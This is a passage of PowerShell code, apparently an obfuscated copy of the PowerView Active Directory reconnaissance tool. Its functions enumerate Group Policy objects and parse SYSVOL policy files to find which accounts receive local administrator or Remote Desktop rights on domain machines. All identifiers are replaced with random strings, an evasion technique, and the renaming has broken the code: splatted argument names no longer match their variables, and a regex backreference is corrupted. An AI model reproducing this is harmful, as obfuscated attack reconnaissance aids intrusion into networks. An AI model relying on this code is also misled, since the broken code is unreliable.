                if (-not $YwI3tSLWxcN90OI[$eaHDqmUVFpRkx]) {
                    
                    Add-RemoteConnection -a9LvymtQdGPNr8cqgsI $eaHDqmUVFpRkx -3ezVSfm6f4k $3ezVSfm6f4k
                    $YwI3tSLWxcN90OI[$eaHDqmUVFpRkx] = $True
                }
            }

            $MXGFwwpzeg7Dj = $GptTmplPaths5KWSPKFJ6
            if (-not $MXGFwwpzeg7Dj.EndsWith('.inf')) {
                $MXGFwwpzeg7Dj += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $MXGFwwpzeg7Dj"

            if ($PSBoundParameters['OutputObject']) {
                $bgoRNzU8YEKrc3l2JPqQx9M5 = Get-IniContent -a9LvymtQdGPNr8cqgsI $MXGFwwpzeg7Dj -Nb4fuJEvKYU1GcgpTP -ErrorAction Stop
                if ($bgoRNzU8YEKrc3l2JPqQx9M5) {
                    $bgoRNzU8YEKrc3l2JPqQx9M5 | Add-Member Noteproperty 'Path' $MXGFwwpzeg7Dj
                    $bgoRNzU8YEKrc3l2JPqQx9M5
                }
            }
            else {
                $bgoRNzU8YEKrc3l2JPqQx9M5 = Get-IniContent -a9LvymtQdGPNr8cqgsI $MXGFwwpzeg7Dj -ErrorAction Stop
                if ($bgoRNzU8YEKrc3l2JPqQx9M5) {
                    $bgoRNzU8YEKrc3l2JPqQx9M5['Path'] = $MXGFwwpzeg7Dj
                    $bgoRNzU8YEKrc3l2JPqQx9M5
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $MXGFwwpzeg7Dj : $_"
        }
    }

    END {
        
        $YwI3tSLWxcN90OI.Keys | ForEach-Object { Remove-RemoteConnection -a9LvymtQdGPNr8cqgsI $_ }
    }
}


function Get-GroupsXML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $9vGExuSYYNXoiuYwZXFKFkpN,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $YwI3tSLWxcN90OI = @{}
    }

    PROCESS {
        try {
            if (($9vGExuSYYNXoiuYwZXFKFkpN -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $eaHDqmUVFpRkx = "\\$((New-Object System.Uri($9vGExuSYYNXoiuYwZXFKFkpN)).Host)\SYSVOL"
                if (-not $YwI3tSLWxcN90OI[$eaHDqmUVFpRkx]) {
                    
                    Add-RemoteConnection -a9LvymtQdGPNr8cqgsI $eaHDqmUVFpRkx -3ezVSfm6f4k $3ezVSfm6f4k
                    $YwI3tSLWxcN90OI[$eaHDqmUVFpRkx] = $True
                }
            }

            [XML]$lYoBjKHfT0vypO6pYKvWYkfiB = Get-Content -a9LvymtQdGPNr8cqgsI $9vGExuSYYNXoiuYwZXFKFkpN -ErrorAction Stop

            
            $lYoBjKHfT0vypO6pYKvWYkfiB | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $YePFivOGqr = $_.Properties.groupName

                
                $7CdMBTA4hHs = $_.Properties.groupSid
                if (-not $7CdMBTA4hHs) {
                    if ($YePFivOGqr -match 'Administrators') {
                        $7CdMBTA4hHs = 'S-1-5-32-544'
                    }
                    elseif ($YePFivOGqr -match 'Remote Desktop') {
                        $7CdMBTA4hHs = 'S-1-5-32-555'
                    }
                    elseif ($YePFivOGqr -match 'Guests') {
                        $7CdMBTA4hHs = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $7CdMBTA4hHs = ConvertTo-SID -XEQn7MoPDNhlYtSpOmwmF5wv5 $YePFivOGqr -3ezVSfm6f4k $3ezVSfm6f4k
                        }
                        else {
                            $7CdMBTA4hHs = ConvertTo-SID -XEQn7MoPDNhlYtSpOmwmF5wv5 $YePFivOGqr
                        }
                    }
                }

                
                $vLpXxy5J8BVMX8VjUelZ = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($vLpXxy5J8BVMX8VjUelZ) {
                    
                    if ($_.filters) {
                        $yDokNOPMVgBJc1rKIsG9QpzSZ = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $yDokNOPMVgBJc1rKIsG9QpzSZ = $qYFR5PCZruUkdna9T
                    }

                    if ($vLpXxy5J8BVMX8VjUelZ -isnot [System.Array]) { $vLpXxy5J8BVMX8VjUelZ = @($vLpXxy5J8BVMX8VjUelZ) }

                    $EwuXGq5Tp6yLWc1Kt = New-Object PSObject
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'GPOPath' $x1jgDSROznq1Wxlmo9CExvgu
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'Filters' $yDokNOPMVgBJc1rKIsG9QpzSZ
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'GroupName' $YePFivOGqr
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'GroupSID' $7CdMBTA4hHs
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'GroupMemberOf' $qYFR5PCZruUkdna9T
                    $EwuXGq5Tp6yLWc1Kt | Add-Member Noteproperty 'GroupMembers' $vLpXxy5J8BVMX8VjUelZ
                    $EwuXGq5Tp6yLWc1Kt.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $EwuXGq5Tp6yLWc1Kt
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $x1jgDSROznq1Wxlmo9CExvgu : $_"
        }
    }

    END {
        
        $YwI3tSLWxcN90OI.Keys | ForEach-Object { Remove-RemoteConnection -a9LvymtQdGPNr8cqgsI $_ }
    }
}


function Get-DomainGPO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $S,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $xrb91IXW,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tHSPwRinjZ69gl0v5fMEQU,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $zvZDgJfPFkdm251R7TEU = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($zvZDgJfPFkdm251R7TEU) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $K2 = @()
                if ($wtWPex5R['Properties']) {
                    $YlQ2RDfeJkPHs7qjrMAuC = $wtWPex5R['Properties']
                }
                $wtWPex5R['Properties'] = 'distinguishedname,dnshostname'
                $ADW7xvL9odTzudB2mHd6ET = $qYFR5PCZruUkdna9T

                if ($PSBoundParameters['ComputerIdentity']) {
                    $wtWPex5R['Identity'] = $xrb91IXW
                    $TfIJKo1L = Get-DomainComputer @SearcherArguments -Lnzs4NIWklS | Select-Object -First 1
                    if(-not $TfIJKo1L) {
                        Write-Verbose "[Get-DomainGPO] Computer '$xrb91IXW' not found!"
                    }
                    $l2mBeiWJzV = $TfIJKo1L.distinguishedname
                    $ADW7xvL9odTzudB2mHd6ET = $TfIJKo1L.dnshostname
                }
                else {
                    $wtWPex5R['Identity'] = $tHSPwRinjZ69gl0v5fMEQU
                    $JdyVW2BmJzGuYVvoHvD = Get-DomainUser @SearcherArguments -Lnzs4NIWklS | Select-Object -First 1
                    if(-not $JdyVW2BmJzGuYVvoHvD) {
                        Write-Verbose "[Get-DomainGPO] User '$tHSPwRinjZ69gl0v5fMEQU' not found!"
                    }
                    $l2mBeiWJzV = $JdyVW2BmJzGuYVvoHvD.distinguishedname
                }

                
                $RHQmWy7ETYv8w3nr09g4KkVx = @()
                $RHQmWy7ETYv8w3nr09g4KkVx += $l2mBeiWJzV.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $l2mBeiWJzV.SubString($l2mBeiWJzV.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $RHQmWy7ETYv8w3nr09g4KkVx"

                if ($RHQmWy7ETYv8w3nr09g4KkVx) {
                    
                    $wtWPex5R.Remove('Properties')
                    $VNcP54ZD16B3Yft = $False
                    ForEach($RBefRfFgBeWcyJQtn66BASA8 in $RHQmWy7ETYv8w3nr09g4KkVx) {
                        $wtWPex5R['Identity'] = $RBefRfFgBeWcyJQtn66BASA8
                        $K2 += Get-DomainOU @SearcherArguments | ForEach-Object {
                            
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $4WL = $_.split(';')
                                        $5PbQh2e2g1j0QDdpMabQvK = $4WL[0]
                                        $qwiPtQHuCKATzfSImDNXg1 = $4WL[1]

                                        if ($VNcP54ZD16B3Yft) {
                                            
                                            
                                            if ($qwiPtQHuCKATzfSImDNXg1 -eq 2) {
                                                $5PbQh2e2g1j0QDdpMabQvK
                                            }
                                        }
                                        else {
                                            
                                            $5PbQh2e2g1j0QDdpMabQvK
                                        }
                                    }
                                }
                            }

                            
                            if ($_.gpoptions -eq 1) {
                                $VNcP54ZD16B3Yft = $True
                            }
                        }
                    }
                }

                if ($ADW7xvL9odTzudB2mHd6ET) {
                    
                    $NnUfVdKjO5siuteHmb = (Get-NetComputerSiteName -mA $ADW7xvL9odTzudB2mHd6ET).SiteName
                    if($NnUfVdKjO5siuteHmb -and ($NnUfVdKjO5siuteHmb -notlike 'Error*')) {
                        $wtWPex5R['Identity'] = $NnUfVdKjO5siuteHmb
                        $K2 += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                $h9PryE = $l2mBeiWJzV.SubString($l2mBeiWJzV.IndexOf('DC='))
                $wtWPex5R.Remove('Identity')
                $wtWPex5R.Remove('Properties')
                $wtWPex5R['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$h9PryE)"
                $K2 += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $K2"

                
                if ($YlQ2RDfeJkPHs7qjrMAuC) { $wtWPex5R['Properties'] = $YlQ2RDfeJkPHs7qjrMAuC }
                else { $wtWPex5R.Remove('Properties') }
                $wtWPex5R.Remove('Identity')

                $K2 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    
                    $wtWPex5R['SearchBase'] = $_
                    $wtWPex5R['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $CO2KFH = ''
                $Iq7bLVAvhKnpjdMlH2 = ''
                $S | Where-Object {$_} | ForEach-Object {
                    $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($It59GzvwEj -match 'LDAP://|^CN=.*') {
                        $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            
                            
                            $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$23DM' from '$It59GzvwEj'"
                            $wtWPex5R['Domain'] = $23DM
                            $zvZDgJfPFkdm251R7TEU = Get-DomainSearcher @SearcherArguments
                            if (-not $zvZDgJfPFkdm251R7TEU) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$23DM'"
                            }
                        }
                    }
                    elseif ($It59GzvwEj -match '{.*}') {
                        $CO2KFH += "(name=$It59GzvwEj)"
                    }
                    else {
                        try {
                            $ypHo7v = (-Join (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$6uq'
                            $CO2KFH += "(objectguid=$ypHo7v)"
                        }
                        catch {
                            $CO2KFH += "(displayname=$It59GzvwEj)"
                        }
                    }
                }
                if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                    $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $c7rZO2V9"
                    $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
                }

                $zvZDgJfPFkdm251R7TEU.filter = "(&(objectCategory=groupPolicyContainer)$Iq7bLVAvhKnpjdMlH2)"
                Write-Verbose "[Get-DomainGPO] filter string: $($zvZDgJfPFkdm251R7TEU.filter)"

                if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $zvZDgJfPFkdm251R7TEU.FindOne() }
                else { $nhxRs5G1 = $zvZDgJfPFkdm251R7TEU.FindAll() }
                $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        
                        $XjTnEcjsPeGHlMl2pD = $_
                        $XjTnEcjsPeGHlMl2pD.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($h2yNsAt -Match '^GC://')) {
                            $XjTnEcjsPeGHlMl2pD = Convert-LDAPProperty -UtHQ $_.Properties
                            try {
                                $5PbQh2e2g1j0QDdpMabQvK = $XjTnEcjsPeGHlMl2pD.distinguishedname
                                $GPODomainaxSBvD4DZBMu = $5PbQh2e2g1j0QDdpMabQvK.SubString($5PbQh2e2g1j0QDdpMabQvK.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $Z1DMhB4i6F = "\\$GPODomainaxSBvD4DZBMu\SysVol\$GPODomainaxSBvD4DZBMu\Policies\$($XjTnEcjsPeGHlMl2pD.cn)"
                                $XjTnEcjsPeGHlMl2pD | Add-Member Noteproperty 'gpcfilesyspath' $Z1DMhB4i6F
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($XjTnEcjsPeGHlMl2pD.distinguishedname)"
                            }
                        }
                        else {
                            $XjTnEcjsPeGHlMl2pD = Convert-LDAPProperty -UtHQ $_.Properties
                        }
                        $XjTnEcjsPeGHlMl2pD.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $XjTnEcjsPeGHlMl2pD
                }
                if ($nhxRs5G1) {
                    try { $nhxRs5G1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $zvZDgJfPFkdm251R7TEU.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $S,

        [Switch]
        $Lqd4rhk7A,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        $HX6YyAJzhvK1VrW = @{}
        if ($PSBoundParameters['Domain']) { $HX6YyAJzhvK1VrW['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $HX6YyAJzhvK1VrW['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Credential']) { $HX6YyAJzhvK1VrW['Credential'] = $3ezVSfm6f4k }

        $xBCmZaU2EJmeru8j = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $wtWPex5R['Identity'] = $S }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $k = $_.displayname
            $El0sdi2IQySFWMBb5 = $_.name
            $Azg9YOsfS = $_.gpcfilesyspath

            $W3mnpseP6XHSYCQ =  @{ 'GptTmplPath' = "$Azg9YOsfS\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $W3mnpseP6XHSYCQ['Credential'] = $3ezVSfm6f4k }

            
            $GsZcR1NS2diCP3nmq = Get-GptTmpl @ParseArgs

            if ($GsZcR1NS2diCP3nmq -and ($GsZcR1NS2diCP3nmq.psbase.Keys -contains 'Group Membership')) {
                $tknXe1x69ldgKQjz5pmqfZJr = @{}

                
                ForEach ($gn in $GsZcR1NS2diCP3nmq.'Group Membership'.GetEnumerator()) {
                    $BOr2NcFYpLPWHjdn8TXZQ4, $g1KLjufvqDJrt94ZFSp = $gn.Key.Split('__', $xBCmZaU2EJmeru8j) | ForEach-Object {$_.Trim()}
                    
                    $BxUMu4HQrViqab2MMTesk4T = $gn.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        
                        $fVNYHEhu = @()
                        ForEach ($jno in $BxUMu4HQrViqab2MMTesk4T) {
                            if ($jno -and ($jno.Trim() -ne '')) {
                                if ($jno -notmatch '^S-1-.*') {
                                    $9hS81tKwCXzl = @{'ObjectName' = $jno}
                                    if ($PSBoundParameters['Domain']) { $9hS81tKwCXzl['Domain'] = $3Ecdwi8qNy }
                                    $xNIK = ConvertTo-SID @ConvertToArguments

                                    if ($xNIK) {
                                        $fVNYHEhu += $xNIK
                                    }
                                    else {
                                        $fVNYHEhu += $jno
                                    }
                                }
                                else {
                                    $fVNYHEhu += $jno
                                }
                            }
                        }
                        $BxUMu4HQrViqab2MMTesk4T = $fVNYHEhu
                    }

                    if (-not $tknXe1x69ldgKQjz5pmqfZJr[$BOr2NcFYpLPWHjdn8TXZQ4]) {
                        $tknXe1x69ldgKQjz5pmqfZJr[$BOr2NcFYpLPWHjdn8TXZQ4] = @{}
                    }
                    if ($BxUMu4HQrViqab2MMTesk4T -isnot [System.Array]) {$BxUMu4HQrViqab2MMTesk4T = @($BxUMu4HQrViqab2MMTesk4T)}
                    $tknXe1x69ldgKQjz5pmqfZJr[$BOr2NcFYpLPWHjdn8TXZQ4].Add($g1KLjufvqDJrt94ZFSp, $BxUMu4HQrViqab2MMTesk4T)
                }

                ForEach ($gn in $tknXe1x69ldgKQjz5pmqfZJr.GetEnumerator()) {
                    if ($gn -and $gn.Key -and ($gn.Key -match '^\*')) {
                        
                        $7CdMBTA4hHs = $gn.Key.Trim('*')
                        if ($7CdMBTA4hHs -and ($7CdMBTA4hHs.Trim() -ne '')) {
                            $YePFivOGqr = ConvertFrom-SID -iQFdt $7CdMBTA4hHs @ConvertArguments
                        }
                        else {
                            $YePFivOGqr = $False
                        }
                    }
                    else {
                        $YePFivOGqr = $gn.Key

                        if ($YePFivOGqr -and ($YePFivOGqr.Trim() -ne '')) {
                            if ($YePFivOGqr -match 'Administrators') {
                                $7CdMBTA4hHs = 'S-1-5-32-544'
                            }
                            elseif ($YePFivOGqr -match 'Remote Desktop') {
                                $7CdMBTA4hHs = 'S-1-5-32-555'
                            }
                            elseif ($YePFivOGqr -match 'Guests') {
                                $7CdMBTA4hHs = 'S-1-5-32-546'
                            }
                            elseif ($YePFivOGqr.Trim() -ne '') {
                                $9hS81tKwCXzl = @{'ObjectName' = $YePFivOGqr}
                                if ($PSBoundParameters['Domain']) { $9hS81tKwCXzl['Domain'] = $3Ecdwi8qNy }
                                $7CdMBTA4hHs = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $7CdMBTA4hHs = $qYFR5PCZruUkdna9T
                            }
                        }
                    }

                    $pMQzc6jJ = New-Object PSObject
                    $pMQzc6jJ | Add-Member Noteproperty 'GPODisplayName' $k
                    $pMQzc6jJ | Add-Member Noteproperty 'GPOName' $El0sdi2IQySFWMBb5
                    $pMQzc6jJ | Add-Member Noteproperty 'GPOPath' $Azg9YOsfS
                    $pMQzc6jJ | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $pMQzc6jJ | Add-Member Noteproperty 'Filters' $qYFR5PCZruUkdna9T
                    $pMQzc6jJ | Add-Member Noteproperty 'GroupName' $YePFivOGqr
                    $pMQzc6jJ | Add-Member Noteproperty 'GroupSID' $7CdMBTA4hHs
                    $pMQzc6jJ | Add-Member Noteproperty 'GroupMemberOf' $gn.Value.Memberof
                    $pMQzc6jJ | Add-Member Noteproperty 'GroupMembers' $gn.Value.Members
                    $pMQzc6jJ.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $pMQzc6jJ
                }
            }

            
            $W3mnpseP6XHSYCQ =  @{
                'GroupsXMLpath' = "$Azg9YOsfS\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $fVNYHEhu = @()
                    ForEach ($jno in $_.GroupMembers) {
                        if ($jno -and ($jno.Trim() -ne '')) {
                            if ($jno -notmatch '^S-1-.*') {

                                
                                $9hS81tKwCXzl = @{'ObjectName' = $YePFivOGqr}
                                if ($PSBoundParameters['Domain']) { $9hS81tKwCXzl['Domain'] = $3Ecdwi8qNy }
                                $xNIK = ConvertTo-SID -3Ecdwi8qNy $3Ecdwi8qNy -XEQn7MoPDNhlYtSpOmwmF5wv5 $jno

                                if ($xNIK) {
                                    $fVNYHEhu += $xNIK
                                }
                                else {
                                    $fVNYHEhu += $jno
                                }
                            }
                            else {
                                $fVNYHEhu += $jno
                            }
                        }
                    }
                    $_.GroupMembers = $fVNYHEhu
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $k
                $_ | Add-Member Noteproperty 'GPOName' $El0sdi2IQySFWMBb5
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $S,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $nZk3swW2LA = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $n5bZo = @{}
        if ($PSBoundParameters['Domain']) { $n5bZo['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $n5bZo['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $n5bZo['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $n5bZo['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $n5bZo['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $n5bZo['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $n5bZo['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        $wDz3XdUaQl = @()

        if ($PSBoundParameters['Identity']) {
            $wDz3XdUaQl += Get-DomainObject @CommonArguments -S $S | Select-Object -Expand objectsid
            $lz = $wDz3XdUaQl
            if (-not $wDz3XdUaQl) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$S'"
            }
        }
        else {
            
            $wDz3XdUaQl = @('*')
        }

        if ($nZk3swW2LA -match 'S-1-5') {
            $wvcMxMPmfk3FImEm = $nZk3swW2LA
        }
